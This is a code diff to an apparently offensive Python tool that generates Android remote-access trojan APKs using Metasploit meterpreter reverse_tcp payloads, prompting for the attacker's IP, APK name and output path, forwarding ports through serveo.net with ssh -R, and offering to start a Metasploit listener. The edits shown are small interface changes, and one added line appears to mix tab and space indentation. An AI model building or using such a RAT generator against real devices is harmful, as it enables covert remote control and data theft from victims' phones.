@@ -27,7 +27,7 @@ print("""[1]android/meterpreter/reverse_tcp
 [4]Android payload works over internet(port forwarding using ssh)
 
 """)
-payload=int(input("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE : "))
+payload=click.prompt("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE (default reverse_tcp): ", type=int, default=1)
 output=click.prompt("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[default /root/]: ", type=str, default="/root")
 name=click.prompt("ENTER THE NAME OF YOUR RAT APK(example: rat.apk)[default febrev.apk]: ", type=str, default="febrev.apk"  )
 lhost=click.prompt("ENTER YOUR IP ADDRESS(lhost) : ", type=str, default=socket.gethostbyname(socket.gethostname()))
@@ -122,7 +122,7 @@ def venom():
 		           os.system(f"ssh -R {port}:{ip}:{port} serveo.net")
     
     else:
-        print("PLEASE SELECT A PAYLOAD.............!!!")
+        print("INPUT TYPE ERROR : YOU SHOULD CHOOSE A NUMBER BETWEEN 1 to 4. !!!")
         print("exiting......")
 
 
@@ -217,6 +217,8 @@ def venom():
     elif server=="n" or server=="N":
         exiting=input("ANY KEY TO EXIT....")
         print("##########  HAPPY HACKING ###########")
+    else:
+	print("#########HAPPY HACKING###############")
     
     os.system(f"rm /var/www/html/{name}")
     msf=input("do you want to start listener/Metasploit?[y/n]: ")
